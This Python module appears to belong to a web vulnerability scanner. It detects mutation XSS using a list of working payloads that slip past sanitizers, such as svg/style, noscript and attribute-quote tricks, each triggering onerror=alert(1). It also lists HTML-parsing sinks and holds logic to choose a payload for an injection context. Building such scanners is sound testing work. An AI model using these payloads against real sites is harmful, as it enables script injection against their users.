"""mXSS (Mutation XSS) detection.

Mutation XSS happens when a browser's HTML parser re-serializes a DOM tree
and the result, when re-parsed, yields different (malicious) nodes.  Classic
vectors exploit:

  * <svg> / <math> foreign content subtleties (case-insensitive in HTML,
    case-sensitive in foreign-content namespaces -> element-name mutation).
  * <noscript> / <template> / <textarea> / <title> "raw text" element
    re-serialization quirks.
  * Backtick / attribute-quote confusion in IE/old Edge.
  * `<style>` containing `</style>` followed by `<script>` after the
    HTML5 parser tree-builder round-trip.
  * `<svg><style><img src=x onerror=alert(1)></style>` -- inside SVG,
    <style> is parsed as raw-text but re-serialized differently, letting
    the inner img tag execute after re-parse.

Most XSS scanners completely miss mXSS because they only check the raw HTTP
response.  This module produces payloads that ONLY fire after a parser
round-trip; when the response contains the payload verbatim AND the page
renders it in a context that triggers re-serialization (innerHTML assignment,
document.write, Range.createContextualFragment, etc.), it reports mXSS.
"""
from __future__ import annotations
import re

# Markers we look for in raw HTTP response after injection.  These payloads
# are designed so the unsafe content is NOT visible to a naïve reflected-XSS
# scanner looking for `<script>` in the response: it only becomes executable
# after the browser's HTML parser mutates the tree.
#
# Each entry: (payload, why_it_mutates, post_mutation_indicator)
MXSS_PAYLOADS: list[tuple[str, str, str]] = [
    # SVG foreign content: <style> inside <svg> is parsed as raw-text in the
    # HTML parser but re-serialized as foreign content, letting nested
    # `<img onerror>` survive the round-trip and execute on innerHTML.
    ("<svg><style><img src=x onerror=alert(1)></style>",
     "svg+style foreign-content re-serialization",
     "onerror=alert(1)"),
    # <math> analog of the above.
    ("<math><style><img src=x onerror=alert(1)></style>",
     "math+style foreign-content re-serialization",
     "onerror=alert(1)"),
    # <noscript> contents are parsed as raw text when scripting is enabled,
    # but as normal HTML when scripting is disabled (or after innerHTML
    # round-trip in a no-script context).  The inner <img> fires only after
    # the mutation.
    ("<noscript><img src=x onerror=alert(1)></noscript>",
     "noscript raw-text mutation across script/no-script contexts",
     "onerror=alert(1)"),
    # <template> content is inert by default, but if the page clones the
    # template's content into the live DOM the inner payload fires.
    ("<template><img src=x onerror=alert(1)></template>",
     "template content cloned into live DOM",
     "onerror=alert(1)"),
    # SVG <desc>/<title> -- raw text in HTML, foreign-content in XML parser.
    ("<svg><desc><img src=x onerror=alert(1)></desc></svg>",
     "svg desc foreign-content mutation",
     "onerror=alert(1)"),
    # Attribute-name mutation via backtick (very old IE/Edge legacy).
    ("<img src=`x`onerror=alert(1)>",
     "backtick attribute-quote mutation (legacy IE/Edge)",
     "onerror=alert(1)"),
    # <style> end-tag confusion: HTML parser closes <style> on `</style>`
    # regardless of context, but inside SVG the CSS parser is more permissive.
    ("<svg><style></style><img src=x onerror=alert(1)></svg>",
     "svg style end-tag confusion",
     "onerror=alert(1)"),
    # Foreign-object namespace confusion: <form> inside <svg> is reparented
    # out of foreign content, sometimes escaping the sanitization context.
    ("<svg><foreignObject><form><img src=x onerror=alert(1)></form></foreignObject></svg>",
     "svg foreignObject form reparenting",
     "onerror=alert(1)"),
    # Mutation via comment insertion: `<!---->` survives sanitizers but the
    # re-parser may merge adjacent text nodes differently.
    ("<svg><style>/*</style>*/<img src=x onerror=alert(1)></svg>",
     "svg style comment-closing mutation",
     "onerror=alert(1)"),
    # Backslash attribute confusion (some sanitizers strip quotes but not
    # backslashes; the parser then treats the backslash as part of the value,
    # letting the trailing event handler bind).
    ("<img src=x\\ onerror=alert(1)>",
     "backslash attribute-separator mutation",
     "onerror=alert(1)"),
]

# Sinks in client JS that take an HTML string and parse it, so a payload
# survives only via mutation.  If any of these appear in the response body
# receiving our payload, mXSS becomes exploitable.
MUTATING_SINKS = [
    "innerHTML",
    "outerHTML",
    "document.write",
    "document.writeln",
    "Range.createContextualFragment",
    "createContextualFragment",
    "insertAdjacentHTML",
    "DOMParser",
    "parseFromString",
    "jQuery.parseHTML",
    "$.parseHTML",
    ".html(",        # jQuery .html()
    "replaceWith(",
    "before(",
    "after(",
]


def payloads() -> list[str]:
    """Return the mXSS payload list (for compatibility with payload loaders)."""
    return [p[0] for p in MXSS_PAYLOADS]


def detect_reflection(response_text: str, injected_marker: str) -> bool:
    """Check whether the mXSS payload survived into the response.

    For mXSS the marker is the payload itself (e.g. `<svg><style>...`).
    If the server reflected it verbatim, the browser will mutate it on
    innerHTML assignment.
    """
    if not response_text or not injected_marker:
        return False
    return injected_marker in response_text


def has_mutating_sink(response_text: str) -> list[str]:
    """Return the list of mutating sinks present in the response body.

    If non-empty, the page has client-side code that takes an HTML string
    and parses it -> mXSS payloads that survive the server's sanitizer
    will execute.

    Phase 19 fix: only look for sinks inside REAL (unescaped) ``<script>``
    blocks and ``on*=`` event-handler attributes.  A naive substring search
    over the whole response would false-positive when the page HTML-escapes
    an injected payload whose text happens to contain ``.html(`` (e.g. a
    jQuery script-gadget payload reflected as ``&lt;script&gt;.html(&lt;...``).
    Escaped payload text is page *content*, not executable JS, so its sink
    keywords must not count.
    """
    if not response_text:
        return []
    # Collect the text regions where real JavaScript can live:
    #   1. Inside <script>...</script> blocks (unescaped tag, case-insensitive).
    #   2. Inside on*="..." event-handler attribute values.
    # Escaped payload text (&lt;script&gt;...) does not match the <script> tag
    # pattern, so it is correctly excluded.
    js_regions: list[str] = []
    for m in re.finditer(
            r"<script\b[^>]*>(.*?)</script>", response_text,
            re.IGNORECASE | re.DOTALL):
        js_regions.append(m.group(1))
    for m in re.finditer(
            r"\bon\w+\s*=\s*(?:\"([^\"]*)\"|'([^']*)'|([^\s>]+))",
            response_text, re.IGNORECASE):
        js_regions.append(m.group(1) or m.group(2) or m.group(3) or "")
    # If there are no script blocks and no event handlers at all, there can
    # be no mutating sink -- return early (also avoids matching sink keywords
    # that appear in escaped reflected text).
    if not js_regions:
        return []
    haystack = "\n".join(js_regions)
    found = []
    for sink in MUTATING_SINKS:
        if sink in haystack:
            found.append(sink)
    return found


def analyze(response_text: str, marker: str) -> dict:
    """Full mXSS analysis of a single response.

    Returns: {
        "reflected":  bool,          # payload present in raw response
        "sinks":      list[str],     # mutating sinks present on page
        "exploitable": bool,         # reflected AND a mutating sink exists
        "payload":    str,           # the payload that was injected
        "vector":     str,           # human-readable mutation description
    }
    """
    reflected = detect_reflection(response_text, marker)
    sinks = has_mutating_sink(response_text)
    vector = ""
    for p, why, _ in MXSS_PAYLOADS:
        if p == marker:
            vector = why
            break
    return {
        "reflected": reflected,
        "sinks": sinks,
        "exploitable": reflected and bool(sinks),
        "payload": marker,
        "vector": vector,
    }


def best_payload_for_context(html_around_marker: str) -> str | None:
    """Pick the mXSS payload most likely to survive given the surrounding HTML.

    Heuristic: if the injection point is inside an existing SVG/Math context,
    the svg/math payloads are most useful; otherwise default to the noscript
    variant (works in many reflection contexts).
    """
    if not html_around_marker:
        return MXSS_PAYLOADS[0][0]
    ctx_lower = html_around_marker.lower()
    if "<svg" in ctx_lower or "<math" in ctx_lower:
        return MXSS_PAYLOADS[0][0]   # svg+style
    if "<noscript" in ctx_lower:
        return MXSS_PAYLOADS[2][0]
    return MXSS_PAYLOADS[0][0]
